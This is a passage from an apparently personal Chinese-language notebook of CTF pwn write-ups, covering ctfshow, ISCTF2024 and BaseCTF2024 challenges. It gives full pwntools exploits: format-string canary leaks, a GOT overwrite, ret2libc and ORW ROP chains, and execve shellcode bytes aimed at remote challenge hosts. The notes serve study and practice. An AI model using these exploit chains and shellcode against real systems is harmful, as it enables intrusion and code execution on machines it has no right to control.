payload += p32(0x80485A6)      

io.sendline(payload)
io.interactive()
```

v3就是canary，在ctfshow的最底下返回的就是v3和传入内容后canary位置的异或结果

相同就没事，不同就抛出异常而已，还是很常规

其他东西没什么好说的

## pwn116

32位canary

存在格式化字符串漏洞

用%数字$p找找\00结尾的

找到了就是canary参数位置

然后栈溢出就好了

```python
from pwn import *
io = remote("pwn.challenge.ctf.show",28117)

# io = process("./pwn116")

backdoor = 0x8048586

#逐个利用fmt漏洞调试，经测试，%15$p会出现/00,标准的canary

# 利用这一点，泄漏canary

leak = io.sendline(b'%15$p')
io.recvuntil(b'0x')

# canary = int(io.recv(8),16)

canary = int(io.recv()[:8],16)
print(canary)

#构造payload
payload = b'a' *(32) + p32(canary) + b'a'*12 + p32(backdoor)

io.sendline(payload)
io.interactive()
```

## pwn117

程序先读flag文件

buf在bss段

后面会直接进gets

那就是很标准的栈溢出了

众所不周知，canary检测失败后就会调用stack_chk_fail函数，输出报错，报错会输出文件名，覆盖文件名指针就能随便读

这个的机制大概情况如下所示（）

[四、技巧篇 - 4.12 利用 __stack_chk_fail - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack](https://www.bookstack.cn/read/CTF-All-In-One/doc-4.12_stack_chk_fail.md)

覆盖变量__libc_argv[0] 这样我们就可以在canary检测失败时，输出我们想要的flag值

但是这题我觉得这个溢出的字符数有点问题，我没想明白为什么是填入504的垃圾数据，但是就能打通，看一个老哥的博客说应该是改编的时候有点史了，504是照抄的参数

反正exp：

```python
from pwn import *
io = remote('pwn.challenge.ctf.show',28170)

flag = 0x06020A0
payload = b'a' *(504) + p64(flag)
io.sendline(payload)
io.interactive()

```

## pwn118

很奇怪，按照116的打法打不出

测出来的canary位置应该是59才对，但是就是打不出

换用劫持stack_chk_fail_got改为getflag函数地址这种方法，就能出

思路就是先找到偏移，这个靠格式化字符串漏洞找就行了

AAAA%p%p%p%p嘛

测出来是第七位

然后就是利用pwn库里面的fmtstr_payload方法，把stack什么什么函数劫持到getflag就好了

exp:

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28185)
elf = ELF('./pwn118')
stack_chk_fail_got = elf.got['__stack_chk_fail']
getflag = elf.sym['get_flag']
payload = fmtstr_payload(7, {stack_chk_fail_got: getflag})
payload = payload.ljust(0x50, b'a')   #0x5C-0xC = 0x50    
io.sendline(payload)
io.recv()
io.interactive()


# from pwn import *

# io = remote("pwn.challenge.ctf.show",28185)

# # io = process("./pwn118")

# backdoor = 0x8048586

#
#

# # leak canary

# leak = io.sendline(b'%59$p')

# io.recvuntil(b'0x')

# canary = int(io.recv()[:8],16)

# print(canary)

#

# payload = b'a' *(0x50) + p32(canary) + b'a'*(0xC) + p32(backdoor)

# io.interactive()
```

虽然但是，这个底下被注释掉的这种方法为什么不行，总不能是我canary的位置还不对吧，那就太难得去找了

## pwn119



# 复现平台

### ret2text

简单ret2text

```python
from pwn import *
sh=remote("gz.imxbt.cn",20489)
payload=b'a'*(0x8+8)+p64(0x401208)
sh.sendline(payload)
sh.interactive()
```



### ret2libc

板子题，exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('gz.imxbt.cn',20906)
# io=process("./pwn")
elf = ELF('./xynulibc')
# libc= ELF(elf.libc.path)

ret_add =0x000000000040101a
pop_rdi =0x0000000000401209
main_add =0x000000000040123C
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x70

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'ezret2libc', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'ezret2libc', payload2)

io.interactive()
```

## emojiCTF

### emoji的签到题

```python
from pwn import *
p = remote("gz.imxbt.cn",20481)
shell =  b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
ret = 0x000000000040101a
buf = 0x0000000000404080
offset = 0x110+8
payload = shell.ljust(offset,b'a') + p64(ret) + p64(buf)
p.sendline(payload)
p.interactive()
```

传入shellcode

用buf2写入

找到ret指令

找到buf2地址

普通的一个ret2shellcode

### emoji基础练习

一个打着略奇怪的ret2libc

（好吧，单纯是我自己蠢）

给了libc文件

这题唯一的难点在于

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init((unsigned int)argc, argv, envp);
  emojiCTF();
  puts("emojiCTF is very fun, what do you think?");
  emoji();
  write(0, "Thank you all for your participation\n", 0x24uLL);
  return 0;
}
```

会先进一个emojictf函数

这个函数会有个输入验证

```c
int emojiCTF()
{
  __int64 v1; // [rsp+8h] [rbp-8h] BYREF

  puts("Enter what you think is correct");
  if ( (unsigned int)__isoc99_scanf("%ld", &v1) != 1 )
  {
    puts("Invalid input, I want to exit");
    exit(1);
  }
  if ( v1 != TARGET_TIMESTAMP )
  {
    puts("Wrong answer, I want to quit");
    exit(1);
  }
  return puts("Congratulations on your correct answer!");
}
```

这个TARGET_TIMESTAMP

我一开始想到的是通过爆破

结果爆破半天好像平台把连接给我关了（）

（这算不算攻击平台啊？）

后来觉得爆破也不是个事

还是跑回IDA去翻

还真有（实则是我一开始没注意看）

```c
.data:0000000000404058                 public TARGET_TIMESTAMP
.data:0000000000404058 TARGET_TIMESTAMP dq 664C2D98h           ; DATA XREF: emojiCTF+58↑r
.data:0000000000404058 _data           ends
.data:0000000000404058
```

0x664C2D98 = 1716268440

然后找到偏移量

找到存在栈溢出的函数地址

直接梭

```python
from pwn import *



io = remote("gz.imxbt.cn",20728)
# io=process("./pwn")
elf = ELF('./pwn')
libc= ELF('./libc.so.6')

io.sendline(b'1716268440')

ret_add =0x000000000040101a
pop_rdi =0x00000000004011df
main_add =0x0000000000401221
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0xD0

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendline(payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

# libc_base = puts_addr - libc.dump('puts')
# system_add = libc_base + libc.dump('system')
# bin_sh_add = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.symbols['puts']
system_add = libc_base + libc.symbols['system']
bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendline(payload2)

io.interactive()


# from pwn import *
# from LibcSearcher import *
# io = remote("gz.imxbt.cn",20728)
# io.sendline(b'1716268440')
#
#
#
#
# elf = ELF('./pwn')
# # libc= ELF('./libc.so.6')
#
# ret_add =0x000000000040101a
# pop_rdi =0x00000000004011df
# main_add =0x0000000000401221
# puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']
#
# print("Puts_got: ",hex(puts_got))
# print("Puts_plt: ",hex(puts_plt))
#
# offset=0xD0
#
# payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
# io.sendline(payload1)
# puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# print("Puts_addr: ",hex(puts_addr))
#
# #libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64
#
# libc_base = puts_addr - 0x080e50
# system_add = libc_base + 0x050d70
# bin_sh_add = libc_base + 0x1d8678
#
#
#
# payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)
#
# io.sendline(payload2)
#
# io.interactive()
```

写了两版（准确来说三版？）想试试直接避免网上找对于libc版本的函数地址的

但是本地elf   libc.so.6文件这个方法莫名其妙的会报错

倒回去想用libcsearcher发现还是报错

到最后还是直接搓个地址出来才打得出来  （五分钟后：原来是因为忘了输入TARGET_TIMESTAMP的值，我说怎么本地上libc文件会打不通）

原本两个payload的输入是用的sendlineafter

但是明明应该没问题的

莫名其妙报错了

但改成sendline之后

莫名其妙的又能用了

直接就通了

奇奇怪怪的（）

玄学exp（）



### emoji的gift

checksec

64位

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\gift'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

NX,PIE,canary，齐活了

PIE就是个地址随机化，main函数里面puts了远程时的实际main地址

接收处理一下

拿到PIE的地址偏移

然后拿到现有bin/sh地址即可

```python
p.sendline(b'%11$lx')
canary = int(p.recv(),16)
```

这里是在利用格式化字符串漏洞拿到canary值

这里是已经找到了canary值在第11位

具体调试原理还有些模糊，日后再补充

```c
C:\Users\26597>nc gz.imxbt.cn 20924
give you a gift!!!!
0x5623a24b824e
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA 0x1 0x1 0x7fbd2a83baa0 (nil)(nil) 0x7025702541414141 0x7025702570257025 0x7025702570257025 0x7025702570257025 0x7025702570257025 0x5700702570257025 0x1 0x7fbd2a64ad90 (nil) 0x5623a24b824e 0x100000000 0x7ffd4d5ca618 (nil) 0x6ffe8df4e0048618 0x7ffd4d5ca618 0x5623a24b824e
    
    
//这里的想法是通过格式化输出漏洞，因为没有要求输出对应的值，就会按照栈帧逐个输出，而最低字节为0000 0000的数值所在位置就会是canary的值，这里的0x5700702570257025 = 0101 0111 0000 0000 0111 0000 0010 0101 0111 0000 0010 0101 0111 0000 0010 0101，算上nil（这个也算值，是空指针），数下来是第11个，所以sendline传入的canary值是第11位的         
```



```python
from pwn import *
p = remote('gz.imxbt.cn',20928)

p.recvuntil(b'give you a gift!!!!')

main_addr = int(p.recv(),16)

pie_base = main_addr - 0x000000000000124E                              #main实际地址  -  main函数附件地址

bin_sh = 0x0000000000001234                                                 #bin/sh附件地址

bin_sh_addr = pie_base + bin_sh

p.sendline(b'%11$lx')
canary = int(p.recv(),16)

ret = pie_base + 0x101a


payload = b'a'*(0x30-8) + p64(canary) + b'a'*(0x8) + p64(ret) + p64(bin_sh_addr)    
#p64是8字节，所以填充垃圾数据时不能一口气填满，需要先过canary验证，然后再补上，之后就是普通的r2t
p.send(payload)
p.interactive()
```

## 金盾杯2024

### Orange





### babyheap





### green





### stackmigration





## ISCTF2024复现

### 0verf10w



### ez_game



### girlfriend





### orange



### ret2orw

感觉会成我印象很深刻的`ORW`入门题

开局先checksec

```shell
┌──(kali㉿kali)-[~/桌面/ret2orw]
└─$ checksec ret2orw  
[*] '/home/kali/桌面/ret2orw/ret2orw'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
                            
```

RELRO半开，NX开着

先回到IDA去看内容

`main`函数很简单，一堆puts然后进入一个`vuln`函数

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x100uLL);
}
```

在 `vuln`函数里面能看到很明显的栈溢出漏洞

在考虑能不能打ret2text了

但是去查字符内容，发现没东西

看到一个所谓`backdoor`函数和`hint`函数

`backdoor`函数还算有概率能用上

```C
int backdoor()
{
  return system("really?\n");
}
```

另外一个`hint`函数什么都没有

但是没字符啊，还因为NX没法传shellcode，也就没法打ret2shellcode

好，那打ret2libc能行吗，反正libc文件给了，直接填板子能打吗？

看看题目名称，ORW

open，read，write，三个函数缩写为ORW，ORW获取内容的适用条件一般是无法正常打开execve啥的情况下

这个时候可以看到存在沙箱函数，seccomp

所以常规的libc大概率不能成功打通，我们先查查沙箱限制了哪些函数

```shell
┌──(kali㉿kali)-[~/桌面/ret2orw]
└─$ seccomp-tools dump ./ret2orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
                                                   
```

这里A = sys_number ，已经是系统调用号

所以常规的函数，像open,read,write什么的都还能用，就execve被ban掉了

那就是一个很常规的ORW了

首先是考虑泄露出puts@address

那这个时候就先写成：

```python
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = remote('gz.imxbt.cn', 20123)
context.binary = 'ret2orw'
elf = ELF('./ret2orw')
libc = ELF('./libc.so.6')
offset = 0x20
pop_rdi = 0x00000000004012ce #: pop rdi ; ret
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x4012F2

#泄漏libc
pl = b'a'*(offset) + p64(0)
pl += p64(pop_rdi)
pl += p64(puts_got)
pl += p64(puts_plt)
pl += p64(main)

io.recvuntil("oh,what's this?\n")
io.sendline(pl)
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts@libc: {hex(leak)}")
```

这里拿到libc然后去找基地址求偏移

```python
#计算偏移指，也就是基地址
libc_offset = libc.sym['puts']
libc_base = leak - libc_offset
log.info(f"Leaked libc_base:{hex(libc_base)}")


#常规ret2libc就按下面的方法打，找system找bin/sh在libc里的地址然后算偏移
# system_addr = libc_base + libc.sym['system']
# bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
# log.info(f"Leaked system_addr:{hex(system_addr)}")
# log.info(f"Leaked bin_sh_addr:{hex(bin_sh_addr)}")

#ORW就有点不一样了，因为没办法用execve，只能去libc里面找open，read，write啥的，然后还要为了调用这些函数，去找一些必要的寄存器地址，这仨函数必用的寄存器是`rdi` `rsi`  `rdx`
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
#	0x000000000002be51 : pop rsi ; ret
pop_rsi = libc_base + 0x000000000002be51
#   0x00000000000904a9 : pop rdx ; pop rbx ; ret
pop_rdx_rbx = libc_base + 0x00000000000904a9
```

然后开始写个ROP链就好了

第一次read，是把flag扔到我想要的bss段地址去，所以看着传参就行了，比如第一次read那个0x40，别太离谱就行了，0x多少基本上都能用，反正够写还不大得没边都能玩

这里的本质是把flag这个文件的文件名写进bss段，经验证，搞成read(0, bss, 0x8)都能玩，这一次存的没有内容，只有文件名

open就没什么好说的，打开嘛

第二次read就从bss的地址开始往后读，读的就是flag的内容，能读完flag就行，你如果短了flag肯定就读不全，能读全flag就行了

剩下的更简单，puts进行输出就好了

时序情况如下：

```
+---------------------+       +-------------------------+
| 发送第二个payload      | -->  | 程序执行ROP链:           |
| (覆盖返回地址+ROP指令)  |      | 1. read(0, bss, 0x40)   |
+---------------------+       |    （等待输入）            |
                              +-------------------------+
                                      |
                                      | 程序暂停，等待输入
                                      v
+---------------------+       +-------------------------+
| 发送 "./flag" 字符串   | -->   | read将字符串写入.bss段     |
+---------------------+       +-------------------------+
                                      |
                                      v
                              +-------------------------+
                              | 继续执行ROP链:            |
                              | 2. open(bss, 0, 0)      |
                              | 3. read(3, bss, 0x40)   |
                              | 4. puts(bss)            |
                              +-------------------------+
```

代码实现：

```python
#然后就是构造第二个payload溢出使执行我们想要实现的ROP链
#read(0, bss, 0x40)
payload = b'a'*(offset + 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(0x40) + p64(0)
payload += p64(read_addr)
#open(bss, 0, 0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(open_addr)
#read(3, bss, 0x40)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(0x40) + p64(0)
payload += p64(read_addr)
#puts(bss)
payload += p64(pop_rdi) + p64(bss)
payload += p64(puts_plt)

# payload = payload.ljust(0x100, b'a')

io.recvuntil("oh,what's this?\n")
io.send(payload)
sleep(1)
io.send('./flag')

io.interactive()
```

还有一个小问题没说，那bss的地址怎么搞？

回到IDA看看

```assembly
.bss:0000000000404060 __bss_start
```

这不有了？但是还是不行，bss段有很多要用的数据，如果就直接写到这，那我们的程序不得直接报错故障退出？

所以隔远点就好了

```python
bss = 0x404060 + 0x600
```

0x600也好，0x400也行，反正隔开点别把重要数据覆盖了就行（实测改成0x23都行，不过讲道理0x23都已经覆盖了一些bss段数据了，只能说有些能覆盖有些不能覆盖，应该还能往下压）

这题感触还算挺深的，debug真是个好东西

完整exp：

```python
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = remote('gz.imxbt.cn', 20125)

# io = process("./ret2orw")

context.binary = 'ret2orw'
elf = ELF('./ret2orw')
libc = ELF('./libc.so.6')
offset = 0x20
pop_rdi = 0x00000000004012ce #: pop rdi ; ret
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
bss = 0x404060 + 0x230
main = 0x4012F2

#泄漏libc
pl = b'a'*(offset) + p64(0)
pl += p64(pop_rdi)
pl += p64(puts_got)
pl += p64(puts_plt)
pl += p64(main)

io.recvuntil("oh,what's this?\n")
io.sendline(pl)
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts@libc: {hex(leak)}")

# 泄漏出的puts_libc:0x7f4e5e01de50

#计算偏移指，也就是基地址
libc_offset = libc.sym['puts']
libc_base = leak - libc_offset
log.info(f"Leaked libc_base:{hex(libc_base)}")


#常规ret2libc就按下面的方法打，找system找bin/sh在libc里的地址然后算偏移

# system_addr = libc_base + libc.sym['system']

# bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# log.info(f"Leaked system_addr:{hex(system_addr)}")

# log.info(f"Leaked bin_sh_addr:{hex(bin_sh_addr)}")

#ORW就有点不一样了
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
#0x000000000002be51 : pop rsi ; ret
pop_rsi = libc_base + 0x000000000002be51

#   0x00000000000904a9 : pop rdx ; pop rbx ; ret

pop_rdx_rbx = libc_base + 0x00000000000904a9



#然后就是构造第二个payload溢出使执行我们想要实现的ROP链
#read(0, bss, 0x40)
payload = b'a'*(offset + 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(0x8) + p64(0)
payload += p64(read_addr)
#open(bss, 0, 0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(open_addr)
#read(3, bss, 0x40)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
payload += p64(read_addr)
#puts(bss)
payload += p64(pop_rdi) + p64(bss)
payload += p64(puts_plt)

# payload = payload.ljust(0x100, b'a')

io.recvuntil("oh,what's this?\n")
io.send(payload)
sleep(1)
io.send('./flag')

io.interactive()
```



### syscall





### 小蓝鲨stack







## BaseCTF2024新生赛

### PIE



### ezstack   （gets✌）





### format_string_level0





### format_string_level1





### format_string_level2







### format_string_level3





### gift  （gets✌）

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\复现平台\\basectf\\gift'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```python
from  pwn import *
from struct import pack
io = remote("gz.imxbt.cn",20215)
# Padding goes here
p = b''

p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000419484) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f2f) # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000047f2eb) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401ce4) # syscall

payload = b'a' *(0x20+8) + p
io.sendlineafter("same",payload)
io.interactive()
```

第一次知道ROP链这种题目可以直接交给ROPgadget进行一把梭

```c
ROPgadget --binary gift --ropchain
```

这样就好了

### orz！  （gets✌）







### shellcode_level0

传入shellcode就可以

```python
from pwn import *
p = remote("gz.imxbt.cn",20373)


shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
p.sendlineafter('shellcode:',shellcode)
p.interactive()
```





### shellcode_level1

checksec

64位，考点很明显就是传shellcode

main函数：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( buf == (void *)-1LL )
  {
    perror("mmap failed");
    return 1;
  }
  else
  {
    read(0, buf, 2uLL);
    ((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);
    if ( munmap(buf, 0x1000uLL) == -1 )
    {
      perror("munmap failed");
      return 1;
    }
    else
    {
      return 0;
    }
  }
}
```

buf区因为mmap函数，被判定为可读可写可执行

原本是可以直接传入shellcode进buf区的

但是

```c
read(0, buf, 2uLL);
```

只能读两字节的buf区内容

```c
((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);
```

这一行，让buf区的内容可以被当作一个函数来执行

但是我们仍然没办法利用buf区传入shellcode达到提权的效果

> 补药啊😫😫😫
> **两字节**怎么写**系统调用**
>
> 丢掉工具，返璞归真。尝试着从**汇编**角度思考思考？
>
> 试着**动态调试**观察下**寄存器**的值？

题干如是说

所以倒回去看IDA和利用gdb进行动态调试

```c
((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);
```

这一句，在反汇编之前的写法是：

```assembly
.text:0000000000001255                 call    rcx
```

这句就是在把buf内容当函数进行执行

用gdb调试

```python
gdb(io,'b *$ rebase(0x1255)' )             //$rebase在调试开PIE的程序的时候可以直接加上程序的随机地址
```

实际调试流程：

```c
------- tip of the day (disable with set show-tips off) -------
Pwndbg mirrors some of Windbg commands like eq, ew, ed, eb, es, dq, dw, dd, db, ds for writing and reading memory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  0xfffffffffffffe00
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da88496dd (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  2
 RDI  0
 RSI  0x7f8da8956000 ◂— 0
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a24198 —▸ 0x5638c4102240 (main+119) ◂— mov rsi, qword ptr [rbp - 0x10]
 RIP  0x7f8da88496dd (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x7f8da88496dd <read+13>     cmp    rax, -0x1000     0xfffffffffffffe00 - -0x1000     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0x7f8da88496e3 <read+19>   ✔ ja     read+112                    <read+112>
    ↓                                                                                                                                                                   
   0x7f8da8849740 <read+112>    mov    rdx, qword ptr [rip + 0xe36b9]     RDX, [_GLOBAL_OFFSET_TABLE_+640] => 0xffffffffffffff88
   0x7f8da8849747 <read+119>    neg    eax
